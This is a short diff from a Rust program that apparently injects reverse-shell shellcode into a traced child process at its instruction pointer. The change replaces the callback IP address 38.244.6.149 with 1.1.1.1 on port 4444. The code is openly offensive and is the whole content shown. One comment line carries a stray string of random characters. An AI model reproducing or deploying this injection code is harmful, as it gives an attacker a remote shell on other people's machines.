@@ -104,7 +104,7 @@ fn main() {
             let mut rip = getregs(child).expect("Could not get child's registers").rip as u64;
 
             // Writing Shellcode to Process RIP registerdGKCXUXhD8Rixp7M
-            let shellcode = generate_reverse_shell("38.244.6.149", 4444);
+            let shellcode = generate_reverse_shell("1.1.1.1", 4444);
 
             // Use a random number generator
             let mut rng = rand::rng();
